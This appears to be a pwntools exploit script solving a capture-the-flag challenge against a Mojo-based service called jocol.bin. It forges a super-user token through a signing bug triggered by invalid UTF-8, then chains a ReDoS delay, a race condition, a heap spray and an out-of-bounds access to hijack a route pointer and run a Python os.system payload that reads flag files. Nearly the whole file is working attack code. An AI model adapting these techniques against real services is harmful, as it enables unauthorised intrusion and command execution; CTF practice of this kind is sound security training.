#!/usr/bin/env python3
import json
import time
import os

PY_PAYLOAD = b'__import__("os").system("ls -la; touch ./pwned.proof")#'
PY_PAYLOAD = b'__import__("os").system("ls -la; cat /flag1.txt")#'
PY_PAYLOAD = b'__import__("os").system("ls -la; cat /flag2.txt")#'

HIJACK_COMMAND_NAME = b'system'

INSERT_CMD = b'ingest|'
PROCESS_CMD = b'deflect|'
NAME_CMD = b'name|'
CLEAR_CMD = b'clear|'
INFO_CMD = b'inspect|'
REG_CMD = b'reg|'

from pwn import *

context.log_level = 'debug'

HOST = os.environ.get("HOST", 'localhost')
PORT = int(os.environ.get("PORT",5555))

TICKET = os.environ.get("TICKET")

#p = process('./devrun.sh')
p = remote(HOST, PORT)

if TICKET:
    p.readuntil('Ticket please: ')
    p.sendline(TICKET.encode("latin-1"))
    
time.sleep(1)

os.system('ps faux | grep jocol.bin')
input('press enter')

# ======== Utils ========

def itob(i):
    return bytes(str(i), 'latin-1')


# ====================== PART 1 ======================

# Trigger a python unicode decode exception by passing an invalid utf-8 string
p.sendline(b'\x72\x65\x67\x7c\x61\xc3\xbf')

# This will cause the returned value to be None which will be signed

# The parsing logic for verifying the token will:
# 1. Split on `|` and take the first two parts as signature and token "None"
# 2. Verify the signature for the token "None"
# 3. Look for the first { which we can put after the last |, thus it will be not be verified and we can put anything we want in the token
p.readuntil(b'[Register][Token]')
token = p.readuntil(b'[$Token').strip().rsplit(b'[$',1)[0]
print('token',token)

time.sleep(.1)

# Forge a token for the super user
token = token + json.dumps(dict(
    ident='super'
)).encode('latin-1')

p.sendline(b'auth|'+token)
p.readuntil(b'[Signal]authenticated')

p.sendline(b'flag1|')

time.sleep(5)

#p.interactive()
# ====================== PART 2 ======================

# ======== Offsets ========


if os.path.exists('/opt/jocol.bin'):
    elf = ELF('/opt/jocol.bin')
if os.path.exists('./jocol.bin'):
    elf = ELF('./jocol.bin')
else:
    elf = ELF('./build/jocol.🐚')

index_fn = elf.symbols[
    'main::index(server::Server&,server::Request,server::Response)'
]
print(hex(index_fn))

def leak_text_addr():
    # The super user can use the info command to get a list of routes and their associated function pointers
    # This gives us a text leak
    p.sendline(INFO_CMD)

    p.readuntil('route index at ')
    index_addr = int(p.readuntil(b'>').strip(b'>'),16)
    return index_addr

index_addr = leak_text_addr()
print('index_addr',hex(index_addr))

elf.address = index_addr - index_fn
print('elf.address',hex(elf.address))

g_routes = elf.symbols['server::g_routes']
print('g_routes',hex(g_routes))

hijack_cmd_str = next(elf.search(HIJACK_COMMAND_NAME+b'\0'))

eval_fn = elf.symbols[
    'util::py_get_builtin_type(stdlib::builtin::string::String)'
]


# ======== Actions ========

def insert_doc(index: int, doc: bytes):
    # <index>,<content>
    p.sendline(INSERT_CMD + itob(index) + b',' + doc)
    p.readuntil('Fragment Ingested')

def clear_data():
    p.sendline(CLEAR_CMD)
    p.readuntil('Purged')

p.clean()

clear_data()

# Put one item back so we can redos later
# TODO actual redos
p.readuntil('[Enquiry]')
time.sleep(.1)
p.sendline(b'col|1,c')
p.readuntil('Collections Created')

p.readuntil('[Enquiry]')
time.sleep(1)
p.sendline(INSERT_CMD+b'0,'+b'b'*50) # Target of RE-dos
p.readuntil('Fragment Ingested')

time.sleep(5)
p.clean()

input("==================== READY TO GO ====================")

#RIP_PL = p64(0x414243444546)
fake_route = p64(eval_fn)
fake_route += p64(hijack_cmd_str)
fake_route += p64(7)
fake_route += p64(7)

if b'\n' in fake_route:
    raise ValueError('newline in data')
if b',' in fake_route:
    raise ValueError('comma in data')

# Two async functions will run at the same time

# 1. This coroutine will incorrectly use a copy of the table rather than a reference to the table
#    And then trigger a minor RE-dos to delay the coroutine while a TOCTOU occurs
time.sleep(1)
off = 20869
pl = PROCESS_CMD
pl += b'^$|(bb|b.)*a' # RE-dos filter
pl += b',' + fake_route # Exploit will point g_routes to fake_route's data
pl += b',0,0'*3 # Accessing 0,0 will delay the coroutine
pl += b',19,'+itob(off) # Offset into our heap spray
p.sendline(pl)

p.readuntil('[Enquiry]')
time.sleep(.1)


# 2. This coroutine will trigger the TOCTOU by adding a new item to the table
#    This will cause OOB offsets on the copy of the table to pass the bounds check once the first coroutine resumes
#    Mojo (at least in 24.2.0) will not perform additional checks of bounds of List accesses
print("\n\n============================= SENDING MUTATOR =============================\n\n")
p.sendline(f'col|20,{",e"*21}')

p.readuntil('[Enquiry]')
time.sleep(1)

# We then will be able to access a list of pointers OOB from the copied table
# The bounds check on this list will be based on an OOB uint which will likely be very large random number
# So our OOB access will be allowed and we will be able to access a pointer we have sprayed on the heap
# This pointer will allow us to overwrite the g_routes pointer with an arbitrary value.
# That value will point to a fake route we placed in the heap
# Accessing this route gives us RIP control
# Then it is a matter of jumping to the function which evals python code

# See the attached image for a visual representation of the exploit flow

data = p64(0)
data += (
    p64(g_routes) +
    p64(0)
)*(
    (0x80*0x1000)//8
)

if b'\n' in data:
    raise ValueError('newline in data')
if b',' in data:
    raise ValueError('comma in data')

context.log_level = 'info'
p.sendline(b'name|'+data)
context.log_level = 'debug'
time.sleep(.5)
p.sendline(b'name|' + PY_PAYLOAD)
context.log_level = 'debug'

p.readuntil(b'Fragments Deflected')

input("Press Enter To Pwn")
p.sendline(HIJACK_COMMAND_NAME+b'|0,0')

p.interactive()
